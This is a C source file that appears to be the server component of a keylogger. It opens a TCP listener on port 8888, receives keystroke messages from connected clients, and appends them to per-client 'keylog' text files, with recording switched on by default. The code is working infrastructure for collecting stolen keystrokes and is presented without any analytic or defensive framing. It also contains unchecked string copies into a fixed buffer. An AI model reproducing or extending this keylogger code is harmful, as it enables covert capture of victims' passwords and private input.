#include "serverManager.h"
#include "utils.h"
#include "constraints.h"
#include "messageManager.h"

#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

extern clientHandler_t clientHndler;

void handleOpcode(message_t msg, int clientSock)
{

    //printf("Handleing Opcode... %c\n", msg.opCode);
    switch (msg.opCode)
    {
        case 'K':
        if(clientHndler.clientsAttr[clientSock].recordKeys)
            {
                printf("Should write to file %d, buffer: %s; size: %d\n", clientHndler.clientsAttr[clientSock].keylogger_fd, 
                msg.buffer, msg.size);
                if (write(clientHndler.clientsAttr[clientSock].keylogger_fd, msg.buffer, msg.size) == -1)
                {
                    printf("ERROR WHEN WRITING TO %d\n", clientHndler.clientsAttr[clientSock].keylogger_fd);
                }
            }
        break;
    default:
        fflush(NULL);
        printf("WRONG OPCODE(%c) FROM %d\n", msg.opCode, clientSock);
        fflush(NULL);
        break;
    }
}

void* handle_client(void* params)
{
    parameters_t *args = (parameters_t*) params;
    // Open a file to log keystrokes
    char filename[BUFFER_SIZE];
    strcpy(filename, "keylog");
    strcat(filename, clientHndler.clientsAttr[args->client_sock].name);
    strcat(filename, ".txt");
    
    clientHndler.clientsAttr[args->client_sock].keylogger_fd = open(filename, O_CREAT | O_APPEND | O_WRONLY, 0664);

    // Receive data from client
    message_t client_message;
    int read_size;
    //printf("reciving message from %d...\n", args->client_sock);
    while ((read_size = (recv(args->client_sock, &client_message, BUFFER_SIZE, 0))) > 0) {
        //HANDLE OPCODE***********************************
        printf("Recieved message from %d: %s\n", args->client_sock, client_message.buffer);
        handleOpcode(client_message, args->client_sock);
        
    }

    if (read_size == 0) {
        printf("Client disconnected\n");
    } else if (read_size == -1) {
        perror("Receive failed");
    }

    close(clientHndler.clientsAttr[args->client_sock].keylogger_fd);
    close(args->client_sock);
    close(args->socket_desc);

    return NULL;
}

void sock_init(int *socket_desc, struct sockaddr_in* server)
{
    *socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    if (*socket_desc == -1) {
        perror("Could not create socket\n");
        exit(-1);
    }
    printf("Socket created\n");

    // Prepare the sockaddr_in structure
    server->sin_family = AF_INET;
    server->sin_addr.s_addr = INADDR_ANY;
    server->sin_port = htons(8888);

    // Bind
    if (bind(*socket_desc, (struct sockaddr *)server, sizeof(*server)) < 0) {
        perror("Bind failed. Error");
        exit(-1);
    }
    printf("Bind done\n");

    // Listen
    if(listen(*socket_desc, 3) == -1)
    {
        perror("Listen failed. Error");
        exit(-1);
    }
}

void setZeroClientHandler(clientAttributes_t* clientAttr)
{
    strcpy(clientAttr->name, "P");
    clientAttr->keylogger_fd = -1;
    clientAttr->recordKeys = 1;
}